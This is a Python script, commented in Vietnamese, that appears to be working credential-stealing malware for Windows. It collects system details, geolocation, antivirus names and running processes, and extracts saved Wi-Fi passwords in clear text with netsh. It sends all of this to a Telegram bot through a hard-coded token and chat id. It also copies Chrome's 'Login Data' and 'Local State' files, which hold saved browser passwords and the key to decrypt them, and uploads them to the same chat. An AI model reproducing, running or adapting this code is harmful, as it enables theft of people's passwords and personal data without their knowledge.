import os
import platform
import socket
import uuid
import psutil
import requests
import time
from getmac import get_mac_address
from screeninfo import get_monitors
from win32com.client import GetObject
import subprocess

class PCInfo:
    def __init__(self):
        self.username = os.getenv("USERNAME") or os.getenv("USER")
        self.hostname = socket.gethostname()
        self.model = self.get_system_model()
        self.screen_resolution = self.get_screen_resolution()
        self.computer_os = platform.platform()
        self.product_key = "Unknown (WMIC unavailable)"
        self.ip = self.get_public_ip()
        self.country = self.get_country()
        self.proxy = self.is_using_proxy()
        self.mac = get_mac_address()
        self.uuid = str(uuid.UUID(int=uuid.getnode()))
        self.cpu = platform.processor()
        self.gpu = self.get_gpu_info()
        self.ram = round(psutil.virtual_memory().total / (1024**3))  # GB
        self.antivirus = self.get_all_antivirus()
        self.current_ip = self.get_current_ip()  # IP của máy tính hiện tại
        self.location = self.get_location()  # Vị trí dựa trên IP
        self.current_time = self.get_current_time()  # Thời gian hiện tại khi chạy tool
        self.disk_usage = self.get_disk_usage()  # Thông tin ổ cứng
        self.python_version = self.get_python_version()  # Phiên bản Python
        self.running_processes = self.get_running_processes()  # Các ứng dụng đang chạy
        self.uptime = self.get_uptime()  # Thời gian khởi động máy
        self.network_speed = self.get_network_speed()  # Tốc độ mạng
        self.wifi_passwords = self.get_wifi_passwords()  # Thu thập mật khẩu Wi-Fi

    def get_system_model(self):
        try:
            obj = GetObject("winmgmts:root\\cimv2").InstancesOf("Win32_ComputerSystem")
            for system in obj:
                return system.Model
        except:
            return "Unknown"

    def get_screen_resolution(self):
        try:
            monitor = get_monitors()[0]
            return f"{monitor.width}x{monitor.height}"
        except:
            return "Unknown"

    def get_public_ip(self):
        try:
            return requests.get("https://api.ipify.org").text
        except:
            return "Unknown"

    def get_country(self):
        try:
            response = requests.get(f"https://ipinfo.io/{self.ip}/json").json()
            return response.get("country", "Unknown")
        except:
            return "Unknown"

    def is_using_proxy(self):
        try:
            response = requests.get("https://ipinfo.io").json()
            return "proxy" in response
        except:
            return False

    def get_gpu_info(self):
        try:
            obj = GetObject("winmgmts:root\\cimv2").InstancesOf("Win32_VideoController")
            for gpu in obj:
                return gpu.Name
        except:
            return "Unknown"

    def get_all_antivirus(self):
        try:
            obj = GetObject("winmgmts:root\\SecurityCenter2").InstancesOf("AntiVirusProduct")
            return ", ".join([antivirus.displayName for antivirus in obj])
        except:
            return "Unknown"

    def get_current_ip(self):
        try:
            return socket.gethostbyname(self.hostname)
        except:
            return "Unknown"

    def get_location(self):
        try:
            response = requests.get(f"https://ipinfo.io/{self.ip}/json").json()
            city = response.get("city", "Unknown")
            region = response.get("region", "Unknown")
            country = response.get("country", "Unknown")
            return f"{city}, {region}, {country}"
        except:
            return "Unknown"

    def get_current_time(self):
        # Lấy thời gian hiện tại theo định dạng HH:MM:SS
        current_time = time.localtime()
        return time.strftime("%H:%M:%S", current_time)

    def get_disk_usage(self):
        # Lấy thông tin về ổ cứng
        disk = psutil.disk_usage('/')
        return f"Total: {disk.total // (1024**3)}GB, Used: {disk.used // (1024**3)}GB, Free: {disk.free // (1024**3)}GB"

    def get_python_version(self):
        # Lấy phiên bản Python hiện tại
        return platform.python_version()

    def get_running_processes(self):
        # Liệt kê các ứng dụng đang chạy
        processes = [p.info['name'] for p in psutil.process_iter(['name']) if p.info['name'] is not None]
        return processes[:10]  # Chỉ lấy 10 ứng dụng đầu tiên

    def get_uptime(self):
        # Lấy thời gian khởi động máy tính
        uptime = time.time() - psutil.boot_time()
        return time.strftime("%H:%M:%S", time.gmtime(uptime))

    def get_network_speed(self):
        # Lấy tốc độ mạng hiện tại
        try:
            net = psutil.net_if_stats()
            return {iface: stats.speed for iface, stats in net.items()}
        except:
            return "Unknown"

    def get_wifi_passwords(self):
        # Lấy mật khẩu các mạng Wi-Fi đã lưu
        wifi_passwords = {}
        try:
            profiles = subprocess.check_output("netsh wlan show profiles", shell=True, universal_newlines=True)
            profiles = [x.split(":")[1][1:-1] for x in profiles.split("\n") if "All User Profile" in x]
            for profile in profiles:
                try:
                    result = subprocess.check_output(f"netsh wlan show profile {profile} key=clear", shell=True, universal_newlines=True)
                    password = [x.split(":")[1][1:-1] for x in result.split("\n") if "Key Content" in x]
                    if password:
                        wifi_passwords[profile] = password[0]
                    else:
                        wifi_passwords[profile] = "No password set"
                except subprocess.CalledProcessError:
                    wifi_passwords[profile] = "Error retrieving password"
        except subprocess.CalledProcessError:
            wifi_passwords = {"Error": "Failed to retrieve Wi-Fi profiles"}
        return wifi_passwords

    def send_telegram_message(self, message):
        bot_token = '8153845166:AAEsUCtk1kbxC7iJ4xmlbjlEQRLdOyrUu8U'
        chat_id = '-4794272986'  # Thay bằng chat_id đúng
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        response = requests.post(url, data={'chat_id': chat_id, 'text': message})
        return response

    def send_file_to_telegram(self, file_path):
        bot_token = '8153845166:AAEsUCtk1kbxC7iJ4xmlbjlEQRLdOyrUu8U'
        chat_id = '-4794272986'  # Thay bằng chat_id đúng
        url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
        
        with open(file_path, 'rb') as file:
            response = requests.post(url, data={'chat_id': chat_id}, files={'document': file})
        
        return response

    def display_info_and_send_files(self):
        message = f'''
**PC Username:** `{self.username}`
**PC Name:** `{self.hostname}`
**Model:** `{self.model}`
**Screen Resolution:** `{self.screen_resolution}`
**OS:** `{self.computer_os}`
**Product Key:** `{self.product_key}`
**Public IP:** `{self.ip}`
**Current IP:** `{self.current_ip}`
**Location:** `{self.location}`
**Country:** `{self.country}`
**Proxy:** `{"Yes" if self.proxy else "No"}`
**MAC:** `{self.mac}`
**UUID:** `{self.uuid}`
**CPU:** `{self.cpu}`
**GPU:** `{self.gpu}`
**RAM:** `{self.ram}GB`
**Antivirus:** `{self.antivirus}`
**Current Time:** `{self.current_time}`
**Disk Usage:** `{self.disk_usage}`
**Python Version:** `{self.python_version}`
**Running Processes:** `{', '.join(self.running_processes)}`
**System Uptime:** `{self.uptime}`
**Network Speed:** `{self.network_speed}`
**Wi-Fi Passwords:** `{self.wifi_passwords if self.wifi_passwords else "No Wi-Fi profiles found"}`
'''

        print(message)
        self.send_telegram_message(message)

        # Đường dẫn tới file Login Data và Local State
        login_data_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
        local_state_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")

        # Sao chép file Login Data để tránh lỗi xung đột khi Chrome đang chạy
        os.system(f'copy "{login_data_path}" "./Login Data"')
        os.system(f'copy "{local_state_path}" "./Local State"')

        # Gửi file Login Data và Local State
        self.send_file_to_telegram("./Login Data")
        self.send_file_to_telegram("./Local State")


if __name__ == '__main__':
    pc_info = PCInfo()
    pc_info.display_info_and_send_files()
